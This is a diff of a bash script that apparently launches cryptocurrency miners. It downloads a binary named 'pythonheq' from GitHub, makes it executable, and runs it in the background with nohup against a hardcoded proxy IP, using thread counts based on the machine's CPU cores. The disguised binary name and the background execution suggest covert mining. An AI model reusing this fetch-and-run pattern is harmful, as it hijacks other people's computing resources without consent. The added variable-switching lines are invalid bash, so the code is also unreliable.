@@ -1,7 +1,7 @@
 #!/bin/bash
 echo 
 echo -e '####################################################################################'
-echo -e '##################         '"RV-XM"' Ver:0.7.7        ################################'
+echo -e '##################         '"RV-XM"' Ver:0.7.8        ################################'
 echo -e '####################################################################################'
 echo 
 echo 
@@ -9,10 +9,13 @@ echo
 
 PROX=217.69.7.240
 ETPort=443
-RVPort=80
-VCPort=21
+RVPort=21
+VCPort=80
 XMPort=8080
 DisplayRefrech=10
+
+SWITCHOPG=RV
+SWITCHOP=XM
 
 VCThreads=$[$(nproc)*2]
 XMThreads=$[$(nproc)*1]
@@ -312,9 +315,21 @@ fi
 ##################################################################
 ########                execution                        #########     
 ##################################################################
+if [ $SWITCHOPG == "AUTO" ]
+then
 #OP=$OP
-OPG=RV
-OP=XM
+OPG=$OPG
+else
+$OPG= $SWITCHOPG
+fi
+
+if [ $SWITCHOP == "AUTO" ]
+then
+OP=$OP
+else
+$OP= $SWITCHOP
+fi
+
 
 i="0"
 
@@ -367,7 +382,7 @@ else
     wget -q https://github.com/one10001/10001code/raw/main/pythonheq
     chmod +x pythonheq
 
-    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t "$VCThreads" 1>> ooutvc 2>> ooutvc &
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" 1>> ooutvc 2>> ooutvc &
 fi
 
 if [ $OPG == "ET" ]
